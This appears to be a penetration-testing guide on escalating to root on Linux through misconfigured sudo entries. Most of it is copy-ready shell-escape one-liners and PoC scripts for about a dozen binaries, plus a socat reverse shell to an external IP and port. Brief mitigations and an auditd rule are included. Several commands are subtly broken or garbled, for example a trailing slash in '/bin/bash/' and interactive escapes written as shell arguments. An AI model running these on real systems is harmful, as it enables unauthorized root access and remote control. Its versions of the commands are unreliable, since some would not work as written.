This advanced guide explores privilege escalation techniques on Linux systems by abusing `sudo` privileges with various binaries. Through detailed explanations, real-world examples, and interactive labs, this guide will equip penetration testers and security researchers with the knowledge to identify and exploit `sudo` misconfigurations responsibly.

---

### **Table of Contents**

1. **Introduction**
2. **Exploit Techniques and In-Depth Explanations**
3. **Exploit Code Examples (PoCs)**
4. **Real-World Examples and Case Studies**
5. **Detection and Mitigation Techniques**
6. **Conclusion**

---

### **1. Introduction**

`sudo` is a fundamental command in Linux that allows permitted users to execute commands as the root user or another user, as specified by the `sudoers` file. While its purpose is to enable safe privilege escalation, misconfigurations or oversights can introduce serious security risks, especially when users have unrestricted access to certain binaries. Here, we’ll dive into how attackers can exploit these scenarios and what defenders can do to prevent them.

---

### **2. Exploit Techniques and In-Depth Explanations**

This section breaks down each privilege escalation technique. Each command provides insights into why it works and which `sudo` misconfigurations enable the exploit.

- Methods :
    
    ### 2.1.1 `vim`
    
    **Command:** `sudo vim -c ':!/bin/bash'`
    
    **Explanation:** `vim` can execute shell commands when invoked with `-c`. The command `:!/bin/bash` runs `/bin/bash` within the editor context, granting an attacker a root shell if `vim` is accessible with sudo.
    
    **PoC:**
    
    ```bash
    sudo vim -c ':!/bin/bash'
    ```
    
    **Mitigation:** Restrict `sudo` permissions for `vim` or use a secure path variable to prevent command execution within `vim`.
    
    ---
    
    ### 2.1.2 `find`
    
    **Command:** `sudo find / etc/passwd -exec /bin/bash \;`
    
    **Explanation:** The `find` command allows executing other commands on matched files using `-exec`. Here, it invokes `/bin/bash`, granting an attacker a shell with root privileges.
    
    **PoC:**
    
    ```bash
    sudo find / etc/passwd -exec /bin/bash \;
    ```
    
    **Mitigation:** Avoid granting `sudo` access to `find` without command restrictions.
    
    ---
    
    ### 2.1.3 `nmap`
    
    **Command:** 
    
    `echo "os.execute('/bin/bash/')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse`
    
    **Explanation:** `nmap` can execute Lua scripts via the `--script` option. By writing a Lua script to open a shell, attackers can achieve privilege escalation.
    
    **PoC:**
    
    ```bash
    echo "os.execute('/bin/bash/')" > /tmp/shell.nse
    sudo nmap --script=/tmp/shell.nse
    ```
    
    **Mitigation:** Disable `nmap` as a `sudo` executable or use a restricted set of options to prevent external script execution.
    
    ---
    
    ### 2.1.4 `env`
    
    **Command:** `sudo env /bin/bash`
    
    **Explanation:** `env` allows running commands in a modified environment. By passing `/bin/bash`, attackers can escalate privileges if `env` is accessible with sudo.
    
    **PoC:**
    
    ```bash
    sudo env /bin/bash
    ```
    
    **Mitigation:** Remove `sudo` privileges for `env` to prevent unintended shell escalation.
    
    ---
    
    ### 2.1.5 `awk`
    
    **Command:** `sudo awk 'BEGIN {system("/bin/bash")}'`
    
    **Explanation:** The `awk` command allows running system commands. Using `sudo`, attackers can invoke a root shell by executing a bash shell.
    
    **PoC:**
    
    ```bash
    sudo awk 'BEGIN {system("/bin/bash")}'
    ```
    
    **Mitigation:** Restrict `sudo` permissions for `awk` or use limited privileges.
    
    ---
    
    ### 2.1.6 `perl`
    
    **Command:** `sudo perl -e 'exec "/bin/bash";'`
    
    **Explanation:** `perl` can execute system commands directly. By spawning a shell with `exec`, attackers gain a root shell.
    
    **PoC:**
    
    ```bash
    sudo perl -e 'exec "/bin/bash";'
    ```
    
    **Mitigation:** Limit `sudo` permissions for `perl`.
    
    ---
    
    ### 2.1.7 `python`
    
    **Command:** `sudo python -c 'import pty;pty.spawn("/bin/bash")'`
    
    **Explanation:** `python` can spawn interactive shells through `pty.spawn`. This method grants attackers a root shell.
    
    **PoC:**
    
    ```bash
    sudo python -c 'import pty;pty.spawn("/bin/bash")'
    ```
    
    **Mitigation:** Remove `sudo` privileges for `python` or enforce restricted permissions.
    
    ---
    
    ### 2.1.8 `less` and `man`
    
    **Commands:**
    
    - `sudo less /etc/hosts - !bash`
    - `sudo man man - !bash`
    
    **Explanation:** `less` and `man` can be exploited through their shell command escape sequences (`!`). Running these commands with `sudo` access allows an attacker to spawn a privileged shell.
    
    **PoC:**
    
    ```bash
    sudo less /etc/hosts - !bash
    
    sudo man man - !bash
    ```
    
    **Mitigation:** Avoid granting `sudo` access to `less` and `man`.
    
    ---
    
    ### 2.1.9 `ftp`
    
    **Command:** `sudo ftp - ! /bin/bash`
    
    **Explanation:** FTP clients like `ftp` allow running shell commands directly. Using `sudo`, an attacker can escape to a root shell with `!` commands.
    
    **PoC:**
    
    ```bash
    sudo ftp - ! /bin/bash
    ```
    
    **Mitigation:** Disable `ftp` with `sudo` or apply restricted shell environments.
    
    ---
    
    ## 2.2 Abusing Network Services with `socat`
    
    **Attacker Setup:**
    
    ```bash
    socat file:`tty`,raw,echo=0 tcp-listen:1234
    ```
    
    **Victim Command:**
    
    ```bash
    sudo socat exec:'sh -li' ,pty,stderr,setsid,sigint,sane tcp:192.168.1.105:1234
    ```
    
    **Explanation:** `socat` can relay interactive shells over network connections. By pairing the attacker and victim machines, a root shell can be transferred remotely.
    
    **Mitigation:** Remove `socat` from `sudo` permissions to prevent shell forwarding.
    
    ---
    
    ## 2.3 Sudo-Based Archive Manipulation with `zip` and `gcc`
    
    ### 2.3.1 `zip`
    
    **Command:** `echo test > notes.txt; sudo zip test.zip notes.txt -T --unzip-command="sh -c /bin/bash"`
    
    **Explanation:** `zip` with `--unzip-command` allows executing commands when unzipping. This can be exploited to open a root shell.
    
    **PoC:**
    
    ```bash
    echo test > notes.txt
    sudo zip test.zip notes.txt -T --unzip-command="sh -c /bin/bash"
    ```
    
    **Mitigation:** Avoid `sudo` permissions for `zip`.
    
    ### 2.3.2 `gcc`
    
    **Command:** `sudo gcc -wrapper /bin/bash,-s .`
    
    **Explanation:** `gcc` allows wrappers to specify an executable. Here, `/bin/bash` is invoked instead of the intended wrapper, granting a privileged shell.
    
    **PoC:**
    
    ```bash
    sudo gcc -wrapper /bin/bash,-s .
    ```
    
    **Mitigation:** Do not grant `sudo` access to `gcc`.
    

---

### **3. Exploit Code Examples (PoCs)**

To automate these privilege escalations, here are some Proof-of-Concept scripts.

### **Example PoC for Automating `sudo find` Exploit**

```bash

#!/bin/bash
echo "Automating privilege escalation with sudo find"
sudo find / -exec /bin/bash \;

```

### **Example PoC for `nmap` NSE Exploit**

```bash

#!/bin/bash
echo "os.execute('/bin/bash')" > /tmp/shell.nse
sudo nmap --script=/tmp/shell.nse

```

> Disclaimer: Use these PoCs only in authorized, controlled environments. Unauthorized use is illegal and unethical.
> 

---

### **4. Real-World Examples and Case Studies**

To illustrate the risk of `sudo` misconfigurations, here are anonymized examples from real-world scenarios:

- **Case Study: Misconfigured `sudoers` Permissions on a Production Server**
    - A company allowed users to run `/usr/bin/vim` as root, intending to let administrators edit configuration files. However, this opened a vulnerability where any user could escape to a root shell via `vim`.
    - An organization had misconfigured `sudoers` permissions, allowing all users to run `/usr/bin/find` as root. During a pentest, the tester escalated privileges by running `sudo find / -exec /bin/bash \;`.
- **CVE References**
    - For instance, CVE-2021-3156, known as "Baron Samedit," was a heap-based buffer overflow in `sudo` that allowed attackers to escalate privileges by exploiting the default configuration.

---

### **5. Detection and Mitigation Techniques**

Detecting and preventing these exploits requires monitoring and securing `sudo` privileges effectively.

- **Detection**:
    - **Auditd Rules**: Configure `auditd` to monitor for suspicious `sudo` usage. Example rule for tracking `vim` and `find`:
        
        ```bash
        -a always,exit -F path=/usr/bin/vim -F auid>=1000 -F auid!=4294967295 -k privilege_abuse
        ```
        
- **Mitigation**:
    - **Limit `sudo` Access**: Restrict access to potentially dangerous binaries (`vim`, `find`, `perl`).
    - **Use SELinux/AppArmor**: Implement policies to restrict binary execution.
    - **Review and Test `sudoers`**: Regularly audit `sudoers` configurations to detect misconfigurations.

By securing `sudo` configurations, administrators can greatly reduce the risk of privilege escalation.

---

### **6. Conclusion**

This guide has covered `sudo` privilege escalation techniques, detection methods, and best practices for securing `sudo` access. By understanding and applying these principles responsibly, readers can identify and mitigate `sudo` vulnerabilities effectively. For a deeper learning experience, utilize the interactive labs and suggested practice environments to solidify knowledge and gain practical experience.
